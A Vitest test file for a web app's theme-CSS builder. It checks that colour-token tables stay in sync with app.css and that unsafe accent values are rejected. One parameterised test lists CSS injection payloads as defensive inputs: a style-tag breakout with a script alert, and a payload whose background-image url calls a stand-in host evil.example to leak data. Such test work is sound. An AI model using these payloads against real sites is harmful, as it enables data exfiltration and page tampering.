// @vitest-environment node
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import {
  buildThemeStyle,
  LIGHT_TOKENS,
  DARK_TOKENS,
  HC_LIGHT_TOKENS,
  HC_DARK_TOKENS,
} from "$lib/appearance/theme-css";
import { blockBody, parseDeclarations } from "./helpers/css-tokens";

const CSS = readFileSync(fileURLToPath(new URL("../../src/app.css", import.meta.url)), "utf8");

describe("the TS tables cannot drift from app.css", () => {
  // The palette exists twice on purpose: as CSS for `system` and the
  // logged-out routes, and as TS for the explicit choices. Neither
  // generates the other, so this is what stops them diverging — without
  // it, a user on `light` and a user on `system` with a light OS would
  // render different colours from the same deploy.
  //
  // The check runs in BOTH directions. A one-directional test (iterate the
  // TS table, look for each value in the CSS) cannot see a token ADDED to
  // app.css's light arm and forgotten here — and that token is exactly the
  // dangerous case: a `theme: dark` user on a light OS would keep the light
  // value for it, because the SSR block never re-asserts what it does not
  // know about.
  const LIGHT_ARM = blockBody(CSS, /@media \(prefers-color-scheme: light\)\s*\{/, "the light arm");
  const cssLight = parseDeclarations(blockBody(LIGHT_ARM, /:root\s*\{/, "the light :root"));
  const cssTheme = parseDeclarations(blockBody(CSS, /@theme\s*\{/, "the @theme block"));
  const cssHcLight = parseDeclarations(
    blockBody(
      blockBody(LIGHT_ARM, /@media \(prefers-contrast: more\)\s*\{/, "the light contrast block"),
      /:root\s*\{/,
      "the light contrast :root",
    ),
  );
  const cssHcDark = parseDeclarations(
    blockBody(
      blockBody(
        CSS.replace(LIGHT_ARM, ""),
        /@media \(prefers-contrast: more\)\s*\{/,
        "the dark contrast block",
      ),
      /:root\s*\{/,
      "the dark contrast :root",
    ),
  );

  // Tokens the app.css light arm declares that the static tables deliberately
  // do NOT carry. Two different reasons, kept apart on purpose:
  //
  //   --color-accent, --color-accent-fg — the (app) layout sets these inline on
  //     the wrapper from the user's stored hex and they are scheme-independent,
  //     so a table entry would be dead code.
  //   --color-accent-ink — emitted per scheme by arm() via readableInk, as a
  //     function of the user's accent. No static table CAN hold it. Its emitted
  //     values are pinned by the buildThemeStyle tests below instead.
  //
  // app.css declares all three, but only as logged-out-route fallbacks.
  const TOKENS_NOT_IN_TABLES = ["--color-accent", "--color-accent-fg", "--color-accent-ink"];

  it("carries exactly the tokens the app.css light arm overrides", () => {
    // Not "the keys whose values differ" — that was the original wording and
    // it is wrong. --color-accent-hover holds the same value in both schemes
    // yet MUST be in the tables, because the light arm declares it and a
    // dark-choosing user on a light OS needs it re-asserted.
    const expected = Object.keys(cssLight)
      .filter((k) => k.startsWith("--") && !TOKENS_NOT_IN_TABLES.includes(k))
      .sort();
    expect(Object.keys(LIGHT_TOKENS).sort()).toEqual(expected);
    expect(Object.keys(DARK_TOKENS).sort()).toEqual(expected);
  });

  it("carries the high-contrast tokens, minus the accent the layout sets inline", () => {
    const drop = (o: Record<string, string>) =>
      Object.keys(o)
        .filter((k) => k !== "--color-accent")
        .sort();
    expect(Object.keys(HC_LIGHT_TOKENS).sort()).toEqual(drop(cssHcLight));
    expect(Object.keys(HC_DARK_TOKENS).sort()).toEqual(drop(cssHcDark));
  });

  it("emits dark values that match the @theme block", () => {
    // Scoped to @theme, not the whole file: --color-accent-hover appears in
    // BOTH @theme and the light arm with the same value, so an unscoped
    // search would match the light copy and report the dark table as in sync
    // even after @theme drifted.
    for (const [token, value] of Object.entries(DARK_TOKENS)) {
      expect(cssTheme[token], `${token} missing from @theme`).toBe(value);
    }
  });

  it("emits light values that match the app.css light arm", () => {
    for (const [token, value] of Object.entries(LIGHT_TOKENS)) {
      expect(cssLight[token], `${token} missing from the light arm`).toBe(value);
    }
  });

  it("emits high-contrast values that match both app.css arms", () => {
    for (const [token, value] of Object.entries(HC_DARK_TOKENS)) {
      expect(cssHcDark[token], `${token} missing from the dark contrast arm`).toBe(value);
    }
    for (const [token, value] of Object.entries(HC_LIGHT_TOKENS)) {
      expect(cssHcLight[token], `${token} missing from the light contrast arm`).toBe(value);
    }
  });
});

describe("buildThemeStyle", () => {
  it("never emits a literal closing style tag from its own source", () => {
    const css = buildThemeStyle("dark", "#4f46e5");
    expect(css.startsWith("<style")).toBe(true);
    expect(css.endsWith("</style>")).toBe(true);
    expect(css.match(/<\/style>/g)).toHaveLength(1);
  });

  it("emits both arms behind media queries for system", () => {
    const css = buildThemeStyle("system", "#4f46e5");
    expect(css).toContain("@media (prefers-color-scheme: light)");
    expect(css).toContain("@media (prefers-color-scheme: dark)");
  });

  it("emits exactly one arm for an explicit choice", () => {
    expect(buildThemeStyle("light", "#4f46e5")).not.toContain("prefers-color-scheme");
    expect(buildThemeStyle("dark", "#4f46e5")).not.toContain("prefers-color-scheme");
  });

  it("uses :root:root so it outranks the unlayered contrast block", () => {
    expect(buildThemeStyle("light", "#4f46e5")).toContain(":root:root");
  });

  // CSP does not cover CSS injection. A value containing `</style>` breaks
  // out of the element, and a pure-CSS payload needs no tag break at all —
  // `#fff} body{background-image:url(https://evil.example/leak)} :root{`
  // produced a real outbound request under this app's img-src.
  it.each([
    "</style><script>alert(1)</script>",
    "#fff} body{display:none;} :root{",
    "#fff} body{background-image:url(https://evil.example/leak?t=x)} :root{",
    "#abc",
    "red",
  ])("refuses to interpolate a non-6-digit-hex accent: %s", (bad) => {
    const css = buildThemeStyle("dark", bad);
    expect(css).not.toContain(bad);
    expect(css.match(/<\/style>/g)).toHaveLength(1);
    // Pin the FALLBACK specifically, not just "some hex". The accent reaches
    // the output only through readableInk, which has its own guard, so
    // asserting a generic hex here would still pass with buildThemeStyle's
    // guard deleted — the injection surface is closed three times over and a
    // loose assertion cannot tell which layer closed it. #9792f0 is
    // readableInk(#4f46e5) on the dark backdrop, i.e. the ink derived from
    // FALLBACK_ACCENT. With the outer guard removed readableInk returns its
    // overlay (#ffffff) instead, so this line fails and the mutation dies.
    expect(css).toContain("--color-accent-ink: #9792f0;");
  });

  it("falls back rather than throwing on an empty accent", () => {
    expect(buildThemeStyle("dark", "")).toMatch(/--color-accent-ink: #[0-9a-f]{6};/);
  });

  // `user_preferences.theme` is a bare `text()` column with no CHECK, so a
  // direct write, a restored backup, or a future door added without the enum
  // can hold anything. Without the guard, `SCHEMES[theme]` is `undefined` and
  // the next line throws — inside the (app) layout's `$derived`, on every
  // authenticated page. Assert the dark arm specifically (not just "some
  // arm"), because the fallback constant is `FALLBACK_THEME = "dark"` and a
  // looser assertion (e.g. merely "doesn't throw") would still pass if the
  // fallback silently changed to something else. `color-scheme: dark;` only
  // appears in the dark arm's body, and `prefers-color-scheme` only appears
  // in the `system` arm's media queries — its absence proves this took the
  // single-arm dark path, not the system path.
  it.each(["garbage", "", "Dark"])(
    "falls back to the dark arm rather than throwing on an invalid theme: %j",
    (bad) => {
      const css = buildThemeStyle(bad, "#4f46e5");
      expect(css).toContain("color-scheme: dark;");
      expect(css).not.toContain("prefers-color-scheme");
    },
  );

  it("derives a different ink per scheme from the same accent", () => {
    const css = buildThemeStyle("system", "#f59e0b");
    // Amber already clears 4.5:1 on the DARK backdrop (5.84:1), so the dark
    // arm echoes the accent unchanged — 3 of the 10 presets do. On light it
    // is 1.71:1 raw and must darken. The property under test is that the two
    // arms disagree, which is the whole reason the ink cannot stay inline on
    // the wrapper: one inline value cannot serve both schemes.
    expect(css).toContain("--color-accent-ink: #f59e0b;");
    expect(css).toContain("--color-accent-ink: #8c5d0e;");
  });
});
